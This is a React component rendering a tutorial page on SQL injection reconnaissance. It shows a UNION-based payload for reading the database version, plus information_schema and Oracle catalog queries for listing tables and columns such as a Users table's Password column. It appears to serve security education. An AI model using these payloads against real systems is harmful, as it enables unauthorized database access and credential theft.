import "../XSS/XSSMaterial.css";
import Lab from "../../Lab/Lab";
import Payloads from "../../Payloads/Payloads";
export default function ExaminingDatabase() {
    return (
        <div id="xss">
            <section className="mainbar">
                <section>
                    <h1>Examining the database in SQL injection attacks</h1>
                    <p>
                        To exploit SQL injection vulnerabilities, it's often
                        necessary to find information about the database. This
                        includes:
                    </p>
                    <ul>
                        <li>The type and version of the database software.</li>
                        <li>
                            The tables and columns that the database contains.
                        </li>
                    </ul>
                </section>
                <section>
                    <h1>Querying the database type and version</h1>
                    <p>
                        You can potentially identify both the database type and
                        version by injecting provider-specific queries to see if
                        one works
                    </p>
                    <p>
                        The following are some queries to determine the database
                        version for some popular database types:
                    </p>
                    <pre className="query">
                        Database type Query
                        <br />
                        Microsoft, MySQL <span>SELECT @@version</span>
                        <br />
                        Oracle <span>SELECT * FROM v$version</span>
                        <br />
                        PostgreSQL <span>SELECT version()</span>
                    </pre>
                    <p>
                        For example, you could use a <span>UNION</span> attack
                        with the following input:
                    </p>
                    <Payloads>' UNION SELECT @@version--</Payloads>
                    <p>
                        This might return the following output. In this case,
                        you can confirm that the database is Microsoft SQL
                        Server and see the version used:
                    </p>
                    <Payloads>
                        Microsoft SQL Server 2016 (SP2) (KB4052908) -
                        13.0.5026.0 (X64)
                        <br />
                        Mar 18 2018 09:11:49
                        <br />
                        Copyright (c) Microsoft Corporation
                        <br />
                        Standard Edition (64-bit) on Windows Server 2016
                        Standard 10.0 {`<X64>`} (Build 14393: ) (Hypervisor)
                    </Payloads>
                </section>
                <section>
                    <h1>Listing the contents of the database</h1>
                    <p>
                        Most database types (except Oracle) have a set of views
                        called the information schema. This provides information
                        about the database.
                    </p>
                    <p>
                        For example, you can query{" "}
                        <span>information_schema.tables</span> to list the
                        tables in the database:
                    </p>
                    <Payloads>SELECT * FROM information_schema.tables</Payloads>
                    <p>This returns output like the following:</p>
                    <Payloads>
                        <pre>
                            TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
                            <br />
                            =====================================================
                            <br />
                            MyDatabase dbo Products BASE TABLE
                            <br />
                            MyDatabase dbo Users BASE TABLE
                            <br />
                            MyDatabase dbo Feedback BASE TABLE
                        </pre>
                    </Payloads>
                    <p>
                        This output indicates that there are three tables,
                        called <span>Products</span>, <span>Users</span>, and{" "}
                        <span>Feedback</span>.
                    </p>
                    <p>
                        You can then query{" "}
                        <span>information_schema.columns</span> to list the
                        columns in individual tables:
                    </p>
                    <Payloads>
                        SELECT * FROM information_schema.columns WHERE
                        table_name = 'Users'
                    </Payloads>
                    <p>This returns output like the following:</p>
                    <Payloads>
                        <pre>
                            TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME
                            DATA_TYPE
                            <br />
                            =================================================================
                            <br />
                            MyDatabase dbo Users UserId int
                            <br />
                            MyDatabase dbo Users Username varchar
                            <br />
                            MyDatabase dbo Users Password varchar
                        </pre>
                    </Payloads>
                    <p>
                        This output shows the columns in the specified table and
                        the data type of each column.
                    </p>
                </section>
                <section>
                    <h1>Listing the contents of an Oracle database</h1>
                    <p>
                        On Oracle, you can find the same information as follows:
                    </p>
                    <ul>
                        <li>
                            You can list tables by querying{" "}
                            <span>all_tables</span>:<br />
                            <Payloads>SELECT * FROM all_tables</Payloads>
                        </li>
                        <li>
                            You can list columns by querying{" "}
                            <span>all_tab_columns</span>:<br />
                            <Payloads>
                                SELECT * FROM all_tab_columns WHERE table_name =
                                'USERS'
                            </Payloads>
                        </li>
                    </ul>
                </section>
            </section>
        </div>
    );
}
